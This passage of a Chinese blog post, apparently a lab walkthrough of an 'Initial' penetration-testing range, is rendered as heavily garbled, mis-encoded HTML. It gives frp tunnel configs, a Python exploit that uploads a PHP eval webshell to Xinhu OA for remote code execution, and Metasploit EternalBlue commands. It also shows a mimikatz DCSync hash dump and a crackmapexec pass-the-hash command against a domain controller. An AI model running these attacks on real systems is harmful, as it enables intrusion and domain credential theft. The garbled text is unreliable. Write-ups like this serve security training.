åŠå…¬ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦å…ˆè¿›è¡Œå†…ç½‘ç©¿é€ï¼Œå…¶ç›®çš„æ˜¯ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨æ”»å‡»æœºè®¿é—®å†…ç½‘çš„æœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€å° <code>vps</code> å’Œå·¥å…· <code>frp</code>ï¼Œå­¦è¿‡webçš„å¸ˆå‚…éƒ½çŸ¥é“ <code>vps</code> æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå°±ä¸åšè§£é‡Šï¼Œ<code>frp</code> çš„ç›¸å…³çŸ¥è¯†ä¹Ÿè¯·è¯»è€…è‡ªè¡Œå­¦ä¹ ï¼Œè¿™é‡Œåªåšç®€å•çš„ä»‹ç»ã€‚<code>frp</code>çš„ä¸‹è½½åœ°å€ä¸ºï¼Œæœ‰linuxå’Œwindowsç‰ˆæœ¬ï¼š<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a><br>è¯¥å·¥å…·çš„ç›®å½•å¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶ä¸­ <code>frpc</code> å’Œ <code>frps</code> æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å°† <code>frps</code> å’Œ <code>frps.ini</code> ä¸Šä¼ åˆ°æˆ‘ä»¬çš„ <code>vps</code>ï¼Œ<code>frpc</code><br>å’Œ <code>frpc.ini</code> ä¸Šä¼ åˆ°æˆ‘ä»¬çš„é¶æœº<br>ä¸‹é¢æ˜¯æˆ‘ç›¸å…³æ–‡ä»¶çš„é…ç½®<br>frpc.iniï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 120.46.199.181 # æˆ‘vpsçš„ipåœ°å€</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure><p>frps.iniï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦ç¡®ä¿ä½ çš„ <code>vps</code> å¼€å¯äº† <code>7000</code> å’Œ <code>798</code> ç«¯å£<br>ç„¶ååœ¨é¶æœºæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>åœ¨ <code>vps</code> æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨æ”»å‡»æœºä½ è‡ªå·±çš„ç”µè„‘ä¸Šï¼ˆ<code>windows</code>ï¼Œä¸æ˜¯ <code>kali</code>ï¼Œ<code>kali</code> çš„é…ç½®æ–¹æ³•åœ¨åé¢æœ‰è®²ï¼‰ä½¿ç”¨ <code>Proxy Servers</code> é…ç½® <code>socks5</code> ä»£ç†å³å¯</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶åŸç†æˆ‘ä¸æ‡‚ï¼Œå­¦é™¢åˆ°ç°åœ¨è¿˜æ²¡æœ‰æ•™è®¡ç®—æœºç½‘ç»œï¼ŒåŠ ä¸Šæˆ‘ä¸€ä¸ªçº¯pwnæ‰‹ä¹Ÿæ²¡å»ç ”ç©¶è¿™ç§ä¸œè¥¿ï¼ˆå…¶å®æ˜¯æˆ‘æ‡’ï¼‰ï¼Œè¯·å¸ˆå‚…ä»¬è½»ç‚¹éª‚ :-(<br>æœ€åè¿˜è¦åœ¨ <code>Proxy Servers</code> ä¸Šé…ç½®ä¸€ä¸‹ <code>Proxificantion Rule</code>ï¼Œå§é™¤äº†åˆšé…ç½®çš„é‚£ä¸€é¡¹ä»¥å¤–çš„å…¨éƒ¨å‹¾å‹¾å»æ‰ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šè®¿é—®ä¸äº†ï¼ŒåŸç†è¿˜æ˜¯ä¸çŸ¥é“ğŸ¤”<br>é…ç½®å®Œåå°±èƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ <code>172.22.1.18</code> è¿›è¡Œè®¿é—®äº†ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç³»ç»Ÿçš„ç‰ˆæœ¬æ˜¯ <code>2.2.8</code> ï¼ˆè¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œå¯ä»¥é€šè¿‡æœç´¢ç³»ç»Ÿçš„ç‰ˆæœ¬å·çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»ç»™å‘ç°çš„æ¼æ´ï¼‰</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¼±å£ä»¤ï¼Œadmin&#x2F;admin123ã€‚</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/19.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç™»å½•åå°±æ˜¯ <code>web</code> æ‰‹çš„äº‹æƒ…äº†ï¼Œè¿™ä¸ªç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæœ‰ç›´æ¥çš„ <code>poc</code>ï¼Œè¿™é‡Œæˆ‘ç›´æ¥å‚è€ƒï¼š<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">[ä»£ç å®¡è®¡]ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ2.2å­˜åœ¨æ–‡ä»¶ä¸Šä¼ é…åˆäº‘å¤„ç†å‡½æ•°ç»„åˆæ‹³RCE_ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿå¼±å£ä»¤-CSDNåšå®¢</a><br>exp.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸åŒç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª <code>1.php</code> æ–‡ä»¶å­˜çš„æ˜¯ä¸€å¥è¯æœ¨é©¬<br>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/20.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶åç›´æ¥èšå‰‘è¿æ¥ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/21.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿æ¥æˆåŠŸï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/22.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°å·²ç»æ‹¥æœ‰äº† <code>system</code> æƒé™ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ <code>Administrator</code> ç”¨æˆ·çš„ç›®å½•ä¸‹æ‰¾åˆ° <code>flag2</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/23.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯¹ <code>ip 172.22.1.21</code> è¿›è¡Œæ¸—é€ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°æ¸—é€æ¡†æ¶ <code>Metasploit Framework</code>ï¼Œ<code>kali</code> è‡ªå¸¦è¿™ä¸ªæ¡†æ¶ï¼Œè¿™é‡Œçš„æ”»å‡»æœºæˆ‘é€‰ç”¨ <code>kali</code>ï¼ˆwindowsä¹Ÿå¯ä»¥å®‰è£…Metasploit Frameworkï¼Œä¸è¿‡ä¸Šé¢æˆ‘è¯´è¿‡ä¹Ÿè¦è®²è®²å¦‚ä½•åœ¨kaliè®¾ç½®ä»£ç†ï¼‰ã€‚æˆ‘ä»¬é¦–å…ˆè¦åœ¨ <code>kali</code> ä¸­è®¾ç½® <code>socks5</code> ä»£ç†ï¼Œå¦åˆ™æˆ‘ä»¬æ— æ³•è®¿é—®å…¶å†…ç½‘çš„ç¯å¢ƒã€‚<br>åœ¨ <code>kali</code> ä¸­è®¾ç½®ä»£ç†æ¯” <code>windows</code> ç®€å•å¾ˆå¤šï¼Œä»–è‡ªå¸¦äº†ä¸€ä¸ª <code>proxychains4</code> å·¥å…·ï¼Œæˆ‘ä»¬åªéœ€è¦ç¼–è¾‘ <code>etc</code> ç›®å½•ä¸‹çš„ <code>proxychians4.conf</code> æ–‡ä»¶ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/24.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åœ¨æœ€ä¸‹é¢çš„ <code>ProxyList</code> ä¸ŠåŠ ä¸Š <code>socks5 vps ip ç«¯å£</code> å³å¯  </p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/25.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶åå°±èƒ½åœ¨æµè§ˆå™¨ä¸­è®¿é—®é¶æœºå†…ç½‘çš„ <code>172.22.1.*</code> é‚£ä¸‰å°æœºå™¨äº†<br>åœ¨ä¸Šé¢ç”¨ <code>fscan</code> çš„æ‰«æä¸­æˆ‘ä»¬å‘ç°è¯¥æœºå­å­˜åœ¨ <code>MS17-010</code> æ¼æ´ï¼Œè¿™ä¸ªå°±æ˜¯å¤§åé¼é¼çš„æ°¸æ’ä¹‹è“æ¼æ´<br>æˆ‘ä»¬å…ˆåœ¨ <code>kali</code> è¾“å…¥ <code>msfconsole</code> å¯åŠ¨ <code>Metasploit Framework</code> ï¼ˆåé¢ç®€ç§° <code>msf</code>ï¼‰</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/26.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ç•Œé¢ååˆ†çš„é…·ç‚«ï¼Œè€Œä¸”æ¯æ¬¡å¯åŠ¨ <code>msf</code> æ—¶è¿™ä¸ªå›¾ç‰‡éƒ½ä¼šä¸ä¸€æ ·<br>è¾“å…¥ <code>search ms17-010</code> æœç´¢ <code>ms17-010</code> ç›¸å…³æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å…±æ‰¾åˆ°äº† <code>4</code> ä¸ªä¸åŒçš„æ¨¡å—ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/27.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºä»–å½±å“æ˜¯ç‰ˆæœ¬æ¯”è¾ƒå¤šï¼Œç„¶åæ¥ä¸‹æ¥ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å‘èµ·æ°¸æ’ä¹‹è“æ”»å‡»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># è®¾ç½®é¶æœºçš„ip</span></span><br><span class="line">exploit  <span class="comment"># å‘èµ·æ”»å‡»</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/28.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿è¡ŒæˆåŠŸä¼šå‡ºç°meterpreter&gt;<br>è¯¥ <code>Meterpreter</code> æ˜¯ <code>metasploit</code> çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥è°ƒç”¨ <code>metasploit</code> çš„ä¸€äº›åŠŸèƒ½ï¼Œå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ›´æ·±å…¥çš„æ¸—é€ï¼Œå…¥è·å–å±å¹•ã€ä¸Šä¼ &#x2F;ä¸‹è½½æ–‡ä»¶ã€åˆ›å»ºæŒä¹…åé—¨ç­‰ã€‚<br>ä¸‹é¢ä»‹ç»ä¸€äº›è¯¥æ¨¡å—å¸¸ç”¨çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot <span class="comment"># æ•è·å±å¹•</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># ä¸‹è½½æ–‡ä»¶</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># è·å–cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># æ¸…é™¤æ—¥å¿—</span></span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ä¸Šå›¾ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ‰“è¿›è¯¥ä¸»æœºï¼Œé—æ†¾çš„æ˜¯è¯¥æœºå­ä¸Šå¹¶æ²¡æœ‰ <code>flag</code>  ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æœ€åçš„<code>flag</code> åœ¨ <code>windows DC</code> åŸŸæ§åˆ¶å™¨ä¸Šé¢<br>æ¥ä¸‹æ¥æ˜¯è¿›è¡Œ <code>DCSync</code> æ”»å‡»ï¼Œè¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹ï¼š<br>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ <code>DCSync</code></p><blockquote><p>åœ¨åŸŸä¸­ï¼Œä¸åŒçš„åŸŸæ§ä¹‹é—´ï¼Œé»˜è®¤æ¯éš”15minå°±ä¼šè¿›è¡Œä¸€æ¬¡åŸŸæ•°æ®åŒæ­¥ã€‚å½“ä¸€ä¸ªé¢å¤–çš„åŸŸæ§æƒ³ä»å…¶ä»–åŸŸæ§åŒæ­¥æ•°æ®æ—¶ï¼Œé¢å¤–åŸŸæ§ä¼šåƒå…¶ä»–åŸŸæ§å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚åŒæ­¥æ•°æ®ã€‚å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚DCSyncå°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œé€šè¿‡ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDirectory Replication Serviceï¼ŒDRSï¼‰çš„GetNCChangesæ¥å£åƒåŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œä»¥è·å¾—æŒ‡å®šåŸŸæ§ä¸Šçš„æ´»åŠ¨ç›®å½•æ•°æ®ã€‚ç›®å½•å¤åˆ¶æœåŠ¡ä¹Ÿæ˜¯ä¸€ç§ç”¨äºåœ¨æ´»åŠ¨ç›®å½•ä¸­å¤åˆ¶å’Œç®¡ç†æ•°æ®çš„RPCåè®®ã€‚è¯¥åè®®ç”±ä¸¤ä¸ªRPCæ¥å£ç»„æˆã€‚åˆ†åˆ«æ˜¯drsuapiå’Œdsaopã€‚<br>DCSyncæ˜¯mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œèƒ½å¤Ÿç”¨æ¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>DCSync</code> æ¥å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·çš„ <code>hash</code> ç„¶åè¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œè¦æƒ³ä½¿ç”¨ <code>DCSync</code> å¿…é¡»è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p><blockquote><p>Administrators ç»„å†…çš„ç”¨æˆ·<br>Domain Admins ç»„å†…çš„ç”¨æˆ·<br>Enterprise Admins ç»„å†…çš„ç”¨æˆ·åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</p></blockquote><p>ç°åœ¨æˆ‘ä»¬å›åˆ°ä¸€å¼€å§‹ <code>fscan</code> çš„æ‰«æç»“æœï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/29.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç”¨æ°¸æ’ä¹‹è“æ‰“ä¸‹çš„è¿™å°æœºå­æ˜¯ <code>enterprise</code> ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯è¯´æ»¡è¶³ <code>DCSync</code> æ”»å‡»çš„æ¡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨ <code>msf</code> ä¸­ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥è·å–ç”¨æˆ·çš„ <code>hash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># è°ƒç”¨mimikatzæ¨¡å—</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼)</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/30.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä»¬æ¯”è¾ƒå…³æ³¨æ˜¯ <code>Administrator</code> ç”¨æˆ·çš„ <code>hash</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>crackmapexec</code> æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° <code>DCåŸŸæ§</code> ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è·å– <code>flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/31.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€ç»ˆ <code>flag</code> ä¸º <code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ„Ÿè§‰è¿™ç§æ¸—é€å’Œç©¿é€çš„webè¿˜æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä»å¤–ç½‘æ‰“è¿›å†…ç½‘çš„è¿‡ç¨‹è¦ç¬¬ä¸€æ­¥è¦åšçš„ä¸æ˜¯è‡ªå·±å»å¯»æ‰¾å’Œæ—¥æ¼æ´ï¼Œè€Œæ˜¯çœ‹çœ‹ç³»ç»Ÿæœ‰æ²¡æœ‰å†å²é—ç•™çš„æ¼æ´ä»¥åŠæ˜¯å¦æœ‰ç°æˆçš„expè¿›è¡Œæ”»å‡»ã€‚æ‰“å›½å†³çš„æ—¶å€™æœ‰çš„é˜Ÿä¼æ‹¿ç€ç°æˆçš„expç›´æ¥å¼€å±€2åˆ†é’Ÿå°±æ‰“è¿›å†…ç½‘äº†ï¼Œè€Œæˆ‘ä»¬é˜Ÿä¼å°±å’Œåšä¼ ç»Ÿwebé¢˜ç›®ä¸€æ ·ä¸€æ­¥ä¸€æ­¥çš„æ‰“ï¼Œè€—è´¹äº†å¾ˆå¤šæ—¶é—´æ‰æ‰“è¿›å»ï¼Œéå¸¸çš„åƒäºã€‚<br>åœ¨æ‰“è¿™ä¸ªé¶åœºä¸­èŠ±è´¹æ—¶é—´æœ€å¤šçš„æ˜¯ç”¨ <code>frp</code> è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œä¸»è¦æ˜¯æˆ‘ç†è§£èƒ½åŠ›æ¯”è¾ƒå·®ï¼Œç½‘ä¸Šçš„æ–‡ç« çœ‹çš„ä¼¼æ‡‚éæ‡‚çš„ã€‚æœŸé—´è¿˜è¯·æ•™äº†unknownå¸ˆå‚…å’Œpanz0eå¸ˆå‚…ï¼Œç„¶åæŸäººå°±å› ä¸ºè¿™ä»¶äº‹æƒ…æ²¡å®Œæˆä¸Šç­ä»»åŠ¡ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/32.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è™½ç„¶é¶åœºæ¯”è¾ƒç®€å•ï¼Œå¯æ˜¯è¿˜æ˜¯èŠ±è´¹äº†æˆ‘è®¸å¤šçš„æ—¶é—´ï¼Œè¿˜æ˜¯Csomeå¸ˆå…„è¯´çš„é‚£å¥è¯ï¼šâ€œèœå°±å¤šç»ƒâ€ï¼Œè¿™ä¸€å¹´æ‰“ç®—å¤šç»ƒç»ƒæ¸—é€ï¼Œå¸Œæœ›æ˜å¹´å›½èµ›ä¸ä¼šç•™ä¸‹é—æ†¾<br>å‚è€ƒï¼š<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">åŸŸæ¸—é€â€”â€”DCSync (3gstudent.github.io)</a><br><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">æ˜¥ç§‹äº‘å¢ƒInitial-WPï¼ˆé™„å¸¦è¯¦ç»†ä»£ç†è¿‡ç¨‹ï¼‰_lnitialé¶æœº-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010ï¼ˆEternal blueæ°¸æ’ä¹‹è“ï¼‰æ¼æ´åˆ©ç”¨+ä¿®å¤æ–¹æ³•-CSDNåšå®¢</a><br><a href="https://bbs.kanxue.com/thread-269208.htm">[åŸåˆ›]MS17-010 â€œæ°¸æ’ä¹‹è“â€æ¼æ´åˆ†æä¸å¤ç°-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a><br><a href="https://cloud.tencent.com/developer/article/1861364">å†…ç½‘æ¸—é€ï½œè°ˆè°ˆHASHä¼ 